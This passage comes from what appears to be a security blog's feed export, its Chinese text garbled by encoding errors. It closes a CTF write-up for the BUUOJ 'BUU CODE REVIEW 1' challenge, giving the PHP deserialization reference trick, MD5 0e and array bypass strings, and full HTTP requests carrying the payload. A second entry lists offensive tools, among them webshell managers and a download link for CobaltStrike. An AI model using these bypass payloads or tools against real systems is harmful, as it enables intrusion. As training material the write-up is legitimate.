class="token property">correct</span><span class="token punctuation">;</span><span class="token variable">$serialize_obj</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$serialize_obj</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"----------------------------------------\n"</span><span class="token punctuation">;</span><span class="token comment">//$obj_str='O:3:"BUU":2:{s:7:"correct";s:0:"";s:5:"input";s:3:"ABC";}';</span><span class="token comment">//$obj2= unserialize($obj_str);</span><span class="token comment">//var_dump($obj2)</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/02/14/ctf-shi-zhan/web-buuoj-buu-code-review-1/image-20250213210014381.png" alt="image-20250213210014381" style="zoom:100%;"><p>åºåˆ—åŒ–åçš„å†…å®¹å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-BASH" data-language="BASH"><code class="language-BASH">O:3:"BUU":2:{s:7:"correct";s:0:"";s:5:"input";R:2;} <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><code>s:5:"input";R:2;</code></p><ul><li><code>s:5:"input";</code> è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦ä¸²å±æ€§ï¼Œå±æ€§åæ˜¯ <code>input</code>ï¼Œé•¿åº¦æ˜¯ 5 ä¸ªå­—ç¬¦ã€‚</li><li><code>R:2;</code> è¡¨ç¤º <code>input</code> çš„å€¼æ˜¯ä¸€ä¸ªå¼•ç”¨ï¼Œå¼•ç”¨çš„æ˜¯åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­çš„ç¬¬ 2 ä¸ªå…ƒç´ ã€‚è¿™é‡Œçš„ç¬¬ 2 ä¸ªå…ƒç´ æ˜¯ <code>s:0:"";</code>ï¼Œå³ç©ºå­—ç¬¦ä¸²ã€‚</li></ul></blockquote><p>inputçš„å€¼å¼•ç”¨äº†correctçš„å€¼ï¼Œæ‰€ä»¥ä¸¤è€…è‡ªç„¶ç›¸ç­‰ï¼Œæ‰€ä»¥èƒ½è§¦å‘file_get_contentsè¯»å–flagçš„æ‰§è¡Œï¼Œå› ä¸ºæˆ‘æœ¬åœ°ç”µè„‘å¹¶æ²¡æœ‰flagæ–‡ä»¶ï¼Œæ‰€ä»¥æŠ¥äº†å¼‚å¸¸è€Œå·²ï¼Œä½†æ˜¯è¯´æ˜input===correctçš„åˆ¤æ–­å·²ç»ç»•è¿‡ã€‚</p><h2 id="2-4-md5å¼±ç±»å‹ç»•è¿‡"><a href="#2-4-md5å¼±ç±»å‹ç»•è¿‡" class="headerlink" title="2.4 md5å¼±ç±»å‹ç»•è¿‡"></a>2.4 md5å¼±ç±»å‹ç»•è¿‡</h2><h3 id="2-4-1-æ–¹æ³•ä¸€ï¼š0eå­—ç¬¦ä¸²"><a href="#2-4-1-æ–¹æ³•ä¸€ï¼š0eå­—ç¬¦ä¸²" class="headerlink" title="2.4.1 æ–¹æ³•ä¸€ï¼š0eå­—ç¬¦ä¸²"></a>2.4.1 æ–¹æ³•ä¸€ï¼š0eå­—ç¬¦ä¸²</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">QNKCDZOs155964671as1091221200a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è¿™å‡ ä¸ªå­—ç¬¦ä¸²çš„md5å€¼æ˜¯0eå¼€å¤´çš„ï¼Œ0eå¼€å¤´çš„å­—ç¬¦ä¸²ä¼šè¢«å½“åšç§‘å­¦è®¡æ•°æ³•å¤„ç†ï¼Œ0çš„æŒ‡æ•°ä»ç„¶æ˜¯0ï¼Œ0exxxxxx==0eyyyyyyyyã€‚</p><h3 id="2-4-2-æ–¹æ³•äºŒï¼šæ•°ç»„ç»•è¿‡"><a href="#2-4-2-æ–¹æ³•äºŒï¼šæ•°ç»„ç»•è¿‡" class="headerlink" title="2.4.2 æ–¹æ³•äºŒï¼šæ•°ç»„ç»•è¿‡"></a>2.4.2 æ–¹æ³•äºŒï¼šæ•°ç»„ç»•è¿‡</h3><p>MD5å¤„ç†æ•°ç»„æ—¶è¿”å›nullã€‚</p><p>md51[]=1,md52[]=2ï¼Œä¸¤ä¸ªæ•°æ•°æ®è™½ç„¶ä¸ç›¸ç­‰ï¼Œä½†æ˜¯è¿™ä¸¤ä¸ªæ•°ç»„ç»è¿‡md5()å‡½æ•°å¤„ç†éƒ½æ˜¯nullï¼Œæ‰€ä»¥md5(md51[])==md5(md51[])ã€‚</p><h1 id="ä¸‰ã€è§£é¢˜"><a href="#ä¸‰ã€è§£é¢˜" class="headerlink" title="ä¸‰ã€è§£é¢˜"></a>ä¸‰ã€è§£é¢˜</h1><h2 id="3-1-payloadæ„é€ "><a href="#3-1-payloadæ„é€ " class="headerlink" title="3.1 payloadæ„é€ "></a>3.1 payloadæ„é€ </h2><p>ç»è¿‡ä¸Šé¢çš„åˆ†æï¼Œå¯ä»¥æ„é€ è¯·æ±‚äº†ã€‚è®¿é—®é¦–é¡µï¼ŒæŠ“åŒ…ï¼Œç„¶åæ·»åŠ GETå’ŒPOSTå‚æ•°ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">GET /?pleaseget<span class="token operator">=</span><span class="token number">1</span> HTTP/1.1Host: 00b7e378-1421-4a1e-adbc-eb44ad7c9d95.node5.buuoj.cn:81Cache-Control: max-age<span class="token operator">=</span><span class="token number">0</span>Upgrade-Insecure-Requests: <span class="token number">1</span>User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/122.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>,image/avif,image/webp,image/apng,*/*<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>,application/signed-exchange<span class="token punctuation">;</span><span class="token assign-left variable">v</span><span class="token operator">=</span>b3<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.7</span>Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span><span class="token assign-left variable">pleasepost</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">&amp;</span><span class="token assign-left variable">md51</span><span class="token operator">=</span>QNKCDZO<span class="token operator">&amp;</span><span class="token assign-left variable">md52</span><span class="token operator">=</span>s155964671a<span class="token operator">&amp;</span><span class="token assign-left variable">obj</span><span class="token operator">=</span>O:3:<span class="token string">"BUU"</span>:2:<span class="token punctuation">{</span>s:7:<span class="token string">"correct"</span><span class="token punctuation">;</span>s:0:<span class="token string">""</span><span class="token punctuation">;</span>s:5:<span class="token string">"input"</span><span class="token punctuation">;</span>R:2<span class="token punctuation">;</span><span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½†æ˜¯æ²¡æœ‰æ‹¿åˆ°flagã€‚</p><p>æ³¨æ„ï¼Œè¯·æ±‚æ”¹æˆPOSTï¼Œä½†è¿˜æ˜¯æ²¡æ‹¿åˆ°ï¼Œå¥‡æ€ªäº†ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">POST /?pleaseget<span class="token operator">=</span><span class="token number">1</span> HTTP/1.1Host: 00b7e378-1421-4a1e-adbc-eb44ad7c9d95.node5.buuoj.cn:81Cache-Control: max-age<span class="token operator">=</span><span class="token number">0</span>Upgrade-Insecure-Requests: <span class="token number">1</span>User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/122.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>,image/avif,image/webp,image/apng,*/*<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>,application/signed-exchange<span class="token punctuation">;</span><span class="token assign-left variable">v</span><span class="token operator">=</span>b3<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.7</span>Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span><span class="token assign-left variable">pleasepost</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">&amp;</span>md51<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>md52<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">&amp;</span><span class="token assign-left variable">obj</span><span class="token operator">=</span>O:3:<span class="token string">"BUU"</span>:2:<span class="token punctuation">{</span>s:7:<span class="token string">"correct"</span><span class="token punctuation">;</span>s:0:<span class="token string">""</span><span class="token punctuation">;</span>s:5:<span class="token string">"input"</span><span class="token punctuation">;</span>R:2<span class="token punctuation">;</span><span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ”¹æˆæ•°ç»„ä¹Ÿæ— æ³•è·å–flagã€‚</p><p>ä»€ä¹ˆé—®é¢˜å‘¢ï¼Ÿ</p><ul><li>åˆ†ææ˜¯è¯·æ±‚å¤´ä¸å¯¹</li></ul><p>è¦åŠ ä¸Š<code>Content-Type: application/x-www-form-urlencoded</code></p><img src="/2025/02/14/ctf-shi-zhan/web-buuoj-buu-code-review-1/image-20250213213232945.png" style="zoom:80%;"><img src="/2025/02/14/ctf-shi-zhan/web-buuoj-buu-code-review-1/image-20250213214943710.png" style="zoom:80%;"><p>æˆåŠŸæ‹¿åˆ°flagã€‚</p><p>ä½†æ˜¯ä¸ºä»€ä¹ˆä¸€å®šè¦åŠ è¿™ä¸ªå¤´å‘¢ï¼Ÿ</p><blockquote><p>å½“è¯·æ±‚å¤´ä¸­åŒ…å« <code>Content-Type: application/x-www-form-urlencoded</code> æ—¶ï¼Œè¯·æ±‚ä½“ä¸­çš„æ•°æ®ä¼šè¢«ç¼–ç ä¸ºé”®å€¼å¯¹çš„å½¢å¼ï¼Œæ¯ä¸ªé”®å€¼å¯¹ä¹‹é—´ç”¨ <code>&amp;</code> åˆ†éš”ï¼Œé”®å’Œå€¼ä¹‹é—´ç”¨ <code>=</code> åˆ†éš”ã€‚ä¾‹å¦‚ï¼š</p><pre class="line-numbers language-none"><code class="language-none">key1=value1&amp;key2=value2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™ç§æ ¼å¼çš„æ•°æ®æ˜“äºè§£æï¼ŒæœåŠ¡å™¨ç«¯å¯ä»¥é€šè¿‡æ ‡å‡†çš„è¡¨å•è§£æå·¥å…·æ¥å¤„ç†è¿™äº›æ•°æ®ã€‚</p><p>ä¸ºäº†ä¿è¯æ•°æ®èƒ½å¤Ÿè¢«æ­£ç¡®è§£æï¼Œå»ºè®®å§‹ç»ˆæ˜¾å¼è®¾ç½® <code>Content-Type</code> è¯·æ±‚å¤´ã€‚</p></blockquote><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flag<span class="token punctuation">{</span>f7e4f1ea-9861-4c2d-8b3a-7eaf75a7b82b<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æœ¬æ–‡ä¸»è¦è€ƒå¯Ÿä»£ç å®¡è®¡ï¼Œæ ¸å¿ƒè€ƒç‚¹ï¼š1ï¼‰md5()å¼±ç±»å‹æ¯”è¾ƒ-0eå­—ç¬¦ä¸²/æ•°ç»„ç»•è¿‡ï¼›2ï¼‰PHPååºåˆ—åŒ–æ¼æ´ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTFå®æˆ˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webå®‰å…¨ </tag>
            
            <tag> CTFå®æˆ˜ </tag>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
            <tag> PHPååºåˆ—åŒ–æ¼æ´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ­¦å™¨æ¸…å•</title>
      <link href="/2025/02/14/gong-fang-gong-ju-ku/wu-qi-qing-dan/"/>
      <url>/2025/02/14/gong-fang-gong-ju-ku/wu-qi-qing-dan/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€æ”»é˜²å¯¹æŠ—å®æˆ˜"><a href="#ä¸€ã€æ”»é˜²å¯¹æŠ—å®æˆ˜" class="headerlink" title="ä¸€ã€æ”»é˜²å¯¹æŠ—å®æˆ˜"></a>ä¸€ã€æ”»é˜²å¯¹æŠ—å®æˆ˜</h1><h2 id="1-1-ä¿¡æ¯æ”¶é›†"><a href="#1-1-ä¿¡æ¯æ”¶é›†" class="headerlink" title="1.1 ä¿¡æ¯æ”¶é›†"></a>1.1 ä¿¡æ¯æ”¶é›†</h2><h3 id="1-1-1-ç»¼åˆèµ„äº§æµ‹ç»˜"><a href="#1-1-1-ç»¼åˆèµ„äº§æµ‹ç»˜" class="headerlink" title="1.1.1 ç»¼åˆèµ„äº§æµ‹ç»˜"></a>1.1.1 ç»¼åˆèµ„äº§æµ‹ç»˜</h3><h4 id="1ï¼‰è¢«åŠ¨èµ„äº§æµ‹ç»˜"><a href="#1ï¼‰è¢«åŠ¨èµ„äº§æµ‹ç»˜" class="headerlink" title="1ï¼‰è¢«åŠ¨èµ„äº§æµ‹ç»˜"></a>1ï¼‰è¢«åŠ¨èµ„äº§æµ‹ç»˜</h4><table><thead><tr><th>å·¥å…·ç®€ç§°</th><th>åœ°å€</th><th>ä¸ªäººæ¨èæŒ‡æ•°ï¼ˆæ»¡åˆ†10ï¼‰</th><th>åŠŸèƒ½</th><th>å¤‡æ³¨</th><th>ç”¨æ³•ç¤ºä¾‹</th><th></th></tr></thead><tbody><tr><td>FOFA</td><td><a href="https://en.fofa.info/">https://en.fofa.info/</a></td><td>9</td><td>è¢«åŠ¨èµ„äº§æµ‹ç»˜ï¼Œæ•°é‡æ¯”è¾ƒå…¨å¯ä»¥ä¸‹è½½èµ„äº§æ•°æ®æ–‡ä»¶ã€‚</td><td></td><td>domain=â€åŸŸåâ€</td><td></td></tr><tr><td>Netcraft</td><td><a href="https://sitereport.netcraft.com/">https://sitereport.netcraft.com/</a></td><td>6</td><td>è¢«åŠ¨èµ„äº§æµ‹ç»˜ï¼Œæ•°æ®ä¸å…¨ã€‚</td><td></td><td>http://åŸŸå</td><td></td></tr><tr><td>Shodan</td><td><a href="https://www.shodan.io/">https://www.shodan.io/</a></td><td>7</td><td>è¢«åŠ¨èµ„äº§æµ‹ç»˜</td><td></td><td>å®Œæ•´åŸŸå</td><td></td></tr><tr><td>Zoomeye</td><td><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></td><td>8</td><td>è¢«åŠ¨èµ„äº§æµ‹ç»˜</td><td>åˆåé’Ÿé¦—ä¹‹çœ¼</td><td>domain=â€åŸŸåâ€</td><td></td></tr><tr><td>Google</td><td><a href="https://www.google.com/">https://www.google.com/</a></td><td>7</td><td>è¢«åŠ¨èµ„äº§æ”¶é›†</td><td></td><td>site:â€åŸŸåâ€</td><td></td></tr></tbody></table><h4 id="2ï¼‰ä¸»åŠ¨èµ„äº§æµ‹ç»˜"><a href="#2ï¼‰ä¸»åŠ¨èµ„äº§æµ‹ç»˜" class="headerlink" title="2ï¼‰ä¸»åŠ¨èµ„äº§æµ‹ç»˜"></a>2ï¼‰ä¸»åŠ¨èµ„äº§æµ‹ç»˜</h4><p>ä»¥ä¸‹å·¥å…·é€šè¿‡ä¸»åŠ¨æ‰«æç›®æ ‡è¿›è¡Œèµ„äº§æµ‹ç»˜ï¼Œä¼šäº§ç”Ÿå¤§é‡æ”»å‡»æµé‡ï¼Œæ…ç”¨ã€‚</p><table><thead><tr><th>å·¥å…·ç®€ç§°</th><th>åœ°å€</th><th>ä¸ªäººæ¨èæŒ‡æ•°ï¼ˆæ»¡åˆ†10ï¼‰</th><th>åŠŸèƒ½</th><th>å¤‡æ³¨</th><th>ç”¨æ³•ç¤ºä¾‹</th><th></th></tr></thead><tbody><tr><td>Goby</td><td><a href="https://gobysec.net/">https://gobysec.net/</a></td><td>7</td><td>ä¸»åŠ¨èµ„äº§æµ‹ç»˜</td><td></td><td></td><td></td></tr><tr><td>ARL</td><td><a href="https://github.com/Aabyss-Team/ARL">https://github.com/Aabyss-Team/ARL</a></td><td>8</td><td>ä¸»åŠ¨èµ„äº§æµ‹ç»˜</td><td>ç¯å¡”</td><td></td><td></td></tr></tbody></table><h3 id="1-1-2-Whoisä¿¡æ¯"><a href="#1-1-2-Whoisä¿¡æ¯" class="headerlink" title="1.1.2 Whoisä¿¡æ¯"></a>1.1.2 Whoisä¿¡æ¯</h3><table><thead><tr><th>å·¥å…·ç®€ç§°</th><th>åœ°å€</th><th>ä¸ªäººæ¨èæŒ‡æ•°ï¼ˆæ»¡åˆ†10ï¼‰</th><th>åŠŸèƒ½</th><th>å¤‡æ³¨</th><th>ç”¨æ³•ç¤ºä¾‹</th><th></th></tr></thead><tbody><tr><td>chinaz</td><td><a href="https://whois.chinaz.com/">https://whois.chinaz.com/</a></td><td>7</td><td>whoisä¿¡æ¯æ”¶é›†</td><td>æœ‰æ—¶å€™ä¿¡æ¯ä¸å…¨</td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><h3 id="1-1-3-IPä¿¡æ¯"><a href="#1-1-3-IPä¿¡æ¯" class="headerlink" title="1.1.3 IPä¿¡æ¯"></a>1.1.3 IPä¿¡æ¯</h3><table><thead><tr><th>å·¥å…·ç®€ç§°</th><th>åœ°å€</th><th>ä¸ªäººæ¨èæŒ‡æ•°ï¼ˆæ»¡åˆ†10ï¼‰</th><th>åŠŸèƒ½</th><th>å¤‡æ³¨</th><th>ç”¨æ³•ç¤ºä¾‹</th><th></th></tr></thead><tbody><tr><td>chinaz</td><td><a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a></td><td>8</td><td>åˆ¤æ–­æ˜¯å¦æœ‰CDN</td><td></td><td></td><td></td></tr><tr><td>ip138</td><td><a href="https://site.ip138.com/">https://site.ip138.com/</a></td><td>8</td><td>æŸ¥è¯¢åŸŸåå¯¹åº”çš„ip</td><td></td><td></td><td></td></tr><tr><td>aizhan</td><td><a href="https://www.aizhan.com/">https://www.aizhan.com/</a></td><td>8</td><td>åŸŸå/IPç»¼åˆæŸ¥è¯¢</td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><h3 id="1-1-4-å­åŸŸå"><a href="#1-1-4-å­åŸŸå" class="headerlink" title="1.1.4 å­åŸŸå"></a>1.1.4 å­åŸŸå</h3><table><thead><tr><th>å·¥å…·ç®€ç§°</th><th>åœ°å€</th><th>ä¸ªäººæ¨èæŒ‡æ•°ï¼ˆæ»¡åˆ†10ï¼‰</th><th>åŠŸèƒ½</th><th>å¤‡æ³¨</th><th>ç”¨æ³•ç¤ºä¾‹</th><th></th></tr></thead><tbody><tr><td>chinaz</td><td><a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a></td><td>8</td><td>åˆ¤æ–­æ˜¯å¦æœ‰CDN</td><td></td><td></td><td></td></tr><tr><td>ip138</td><td><a href="https://site.ip138.com/">https://site.ip138.com/</a></td><td>8</td><td>æŸ¥è¯¢å­åŸŸååŠip</td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><h2 id="1-2-è¾¹ç•Œçªç ´"><a href="#1-2-è¾¹ç•Œçªç ´" class="headerlink" title="1.2 è¾¹ç•Œçªç ´"></a>1.2 è¾¹ç•Œçªç ´</h2><h3 id="1-2-1-ç«¯å£æ‰«æ"><a href="#1-2-1-ç«¯å£æ‰«æ" class="headerlink" title="1.2.1 ç«¯å£æ‰«æ"></a>1.2.1 ç«¯å£æ‰«æ</h3><table><thead><tr><th>å·¥å…·ç®€ç§°</th><th>åœ°å€</th><th>ä¸ªäººæ¨èæŒ‡æ•°ï¼ˆæ»¡åˆ†10ï¼‰</th><th>åŠŸèƒ½</th><th>å¤‡æ³¨</th><th>ç”¨æ³•ç¤ºä¾‹</th></tr></thead><tbody><tr><td>nmap</td><td><a href="https://nmap.org/">https://nmap.org/</a></td><td>9</td><td>ç«¯å£æ‰«æï¼ŒæœåŠ¡è¯†åˆ«ï¼Œæ“ä½œç³»ç»Ÿè¯†åˆ«</td><td></td><td><code>nmap ip -sV -sC -Pn -T 4 -p-</code></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><h3 id="1-2-2-ç›®å½•æ‰«æ"><a href="#1-2-2-ç›®å½•æ‰«æ" class="headerlink" title="1.2.2 ç›®å½•æ‰«æ"></a>1.2.2 ç›®å½•æ‰«æ</h3><table><thead><tr><th>å·¥å…·ç®€ç§°</th><th>åœ°å€</th><th>ä¸ªäººæ¨èæŒ‡æ•°ï¼ˆæ»¡åˆ†10ï¼‰</th><th>åŠŸèƒ½</th><th>å¤‡æ³¨</th><th>ç”¨æ³•ç¤ºä¾‹</th></tr></thead><tbody><tr><td>dirsearch</td><td><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></td><td>9</td><td>ç›®å½•æ‰«æ</td><td>python3.9åŠä»¥ä¸Š</td><td><code>python dirsearch.py -u http://172.20.10.2/</code></td></tr><tr><td>URLfinder</td><td><a href="https://github.com/pingc0y/URLFinder">https://github.com/pingc0y/URLFinder</a></td><td>7</td><td>URLFinderæ˜¯ä¸€æ¬¾å¿«é€Ÿã€å…¨é¢ã€æ˜“ç”¨çš„é¡µé¢ä¿¡æ¯æå–å·¥å…·.ç”¨äºåˆ†æé¡µé¢ä¸­çš„jsä¸url,æŸ¥æ‰¾éšè—åœ¨å…¶ä¸­çš„æ•æ„Ÿä¿¡æ¯æˆ–æœªæˆæƒapiæ¥å£ã€‚ æ›´åå‘äºé¡µé¢ä¿¡æ¯çš„æ·±åº¦æå–ï¼Œä¸æ˜¯ç›®å½•æ‰«æã€‚</td><td>goï¼Œå¯ä»¥ç›´æ¥ä¸‹è½½releaseç‰ˆä½¿ç”¨</td><td><code>./URLFinder -u http://172.20.10.2/ -s all -m 3 -o res.html</code></td></tr><tr><td>yjdirscan(å¾¡å‰‘)</td><td><a href="https://github.com/foryujian/yjdirscan">https://github.com/foryujian/yjdirscan</a></td><td>7</td><td>ç›®å½•æ‰«æ</td><td>winç³»ç»Ÿ</td><td></td></tr></tbody></table><h3 id="1-2-3-webshellç®¡ç†å·¥å…·"><a href="#1-2-3-webshellç®¡ç†å·¥å…·" class="headerlink" title="1.2.3 webshellç®¡ç†å·¥å…·"></a>1.2.3 webshellç®¡ç†å·¥å…·</h3><table><thead><tr><th>å·¥å…·ç®€ç§°</th><th>åœ°å€</th><th>ä¸ªäººæ¨èæŒ‡æ•°ï¼ˆæ»¡åˆ†10ï¼‰</th><th>åŠŸèƒ½</th><th>å¤‡æ³¨</th><th>ç”¨æ³•ç¤ºä¾‹</th></tr></thead><tbody><tr><td>AntSwordï¼ˆèšå‰‘ï¼‰</td><td><a href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a></td><td>9</td><td>webshellç®¡ç†</td><td></td><td></td></tr><tr><td>Godzillaï¼ˆå“¥æ–¯æ‹‰ï¼‰</td><td><a href="https://github.com/BeichenDream/Godzilla">https://github.com/BeichenDream/Godzilla</a></td><td>8</td><td>webshellç®¡ç†</td><td></td><td></td></tr></tbody></table><h3 id="1-2-4-ç»¼åˆå·¥å…·"><a href="#1-2-4-ç»¼åˆå·¥å…·" class="headerlink" title="1.2.4 ç»¼åˆå·¥å…·"></a>1.2.4 ç»¼åˆå·¥å…·</h3><table><thead><tr><th>å·¥å…·ç®€ç§°</th><th>åœ°å€</th><th>ä¸ªäººæ¨èæŒ‡æ•°ï¼ˆæ»¡åˆ†10ï¼‰</th><th>åŠŸèƒ½</th><th>å¤‡æ³¨</th><th>ç”¨æ³•ç¤ºä¾‹</th></tr></thead><tbody><tr><td>yakit</td><td><a href="https://yaklang.com/">https://yaklang.com/</a></td><td>9</td><td>å•å…µå·¥å…·å¹³å°</td><td></td><td></td></tr><tr><td>burpsuite</td><td><a href="https://portswigger.net/burp">https://portswigger.net/burp</a></td><td>9</td><td>å•å…µå·¥å…·å¹³å°</td><td></td><td></td></tr></tbody></table><h2 id="1-3-å†…ç½‘æ”»é˜²-ç»¼åˆæ¸—é€"><a href="#1-3-å†…ç½‘æ”»é˜²-ç»¼åˆæ¸—é€" class="headerlink" title="1.3 å†…ç½‘æ”»é˜²/ç»¼åˆæ¸—é€"></a>1.3 å†…ç½‘æ”»é˜²/ç»¼åˆæ¸—é€</h2><table><thead><tr><th>å·¥å…·ç®€ç§°</th><th>åœ°å€</th><th>ä¸ªäººæ¨èæŒ‡æ•°ï¼ˆæ»¡åˆ†10ï¼‰</th><th>åŠŸèƒ½</th><th>å¤‡æ³¨</th><th>ç”¨æ³•ç¤ºä¾‹</th></tr></thead><tbody><tr><td>CobaltStrike 3.14</td><td>é“¾æ¥: <a href="https://pan.baidu.com/s/1AW4nL_cJOsrO64xZQltMZA">https://pan.baidu.com/s/1AW4nL_cJOsrO64xZQltMZA</a> æå–ç : yiqp</td><td>9</td><td>ç»¼åˆæ¸—é€</td><td>è¯¦è§æœ¬ç«™ã€ŠCobaltStrikeã€‹</td><td></td></tr><tr><td>metasploit framework</td><td>kaliå†…ç½®ï¼Œ<a href="https://www.metasploit.com/">https://www.metasploit.com/</a></td><td>9</td><td>ç»¼åˆæ¸—é€</td><td>è¯¦è§æœ¬ç«™ã€ŠMSF-Metasploitã€‹</td><td></td></tr></tbody></table><h1 id="äºŒã€é¶åœºç»¼åˆæ¸—é€å®æˆ˜"><a href="#äºŒã€é¶åœºç»¼åˆæ¸—é€å®æˆ˜" class="headerlink" title="äºŒã€é¶åœºç»¼åˆæ¸—é€å®æˆ˜"></a>äºŒã€é¶åœºç»¼åˆæ¸—é€å®æˆ˜</h1><h1 id="ä¸‰ã€æ¼æ´æŒ–æ˜"><a href="#ä¸‰ã€æ¼æ´æŒ–æ˜" class="headerlink" title="ä¸‰ã€æ¼æ´æŒ–æ˜"></a>ä¸‰ã€æ¼æ´æŒ–æ˜</h1><h1 id="å››ã€CTFå®æˆ˜"><a href="#å››ã€CTFå®æˆ˜" class="headerlink" title="å››ã€CTFå®æˆ˜"></a>å››ã€CTFå®æˆ˜</h1><h2 id="å“ˆå¸Œç ´è§£å·¥å…·"><a href="#å“ˆå¸Œç ´è§£å·¥å…·" class="headerlink" title="å“ˆå¸Œç ´è§£å·¥å…·"></a>å“ˆå¸Œç ´è§£å·¥å…·</h2><table><thead><tr><th>å·¥å…·ç®€ç§°</th><th>åœ°å€</th><th>ä¸ªäººæ¨èæŒ‡æ•°ï¼ˆæ»¡åˆ†10ï¼‰</th><th>åŠŸèƒ½</th><th>å¤‡æ³¨</th><th>ç”¨æ³•ç¤ºä¾‹</th></tr></thead><tbody><tr><td>cmd5</td><td><a href="https://www.cmd5.com/">https://www.cmd5.com/</a></td><td>7</td><td>ç ´è§£å¸¸è§çš„md5å€¼</td><td>æœ‰æ—¶éœ€è¦ä»˜è´¹</td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><h2 id="ç¼–ç è½¬æ¢å·¥å…·"><a href="#ç¼–ç è½¬æ¢å·¥å…·" class="headerlink" title="ç¼–ç è½¬æ¢å·¥å…·"></a>ç¼–ç è½¬æ¢å·¥å…·</h2><table><thead><tr><th>å·¥å…·ç®€ç§°</th><th>åœ°å€</th><th>ä¸ªäººæ¨èæŒ‡æ•°ï¼ˆæ»¡åˆ†10ï¼‰</th><th>åŠŸèƒ½</th><th>å¤‡æ³¨</th><th>ç”¨æ³•ç¤ºä¾‹</th></tr></thead><tbody><tr><td>tool.lu</td><td><a href="https://tool.lu/hexconvert/">https://tool.lu/hexconvert/</a></td><td>8</td><td>è¿›åˆ¶è½¬æ¢</td><td></td><td></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> æ”»é˜²å·¥å…·åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ”»é˜²å·¥å…·åº“ </tag>
            
            <tag> æ­¦å™¨æ¸…å• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web-buuoj-(BUU BURP COURSE 1)</title>
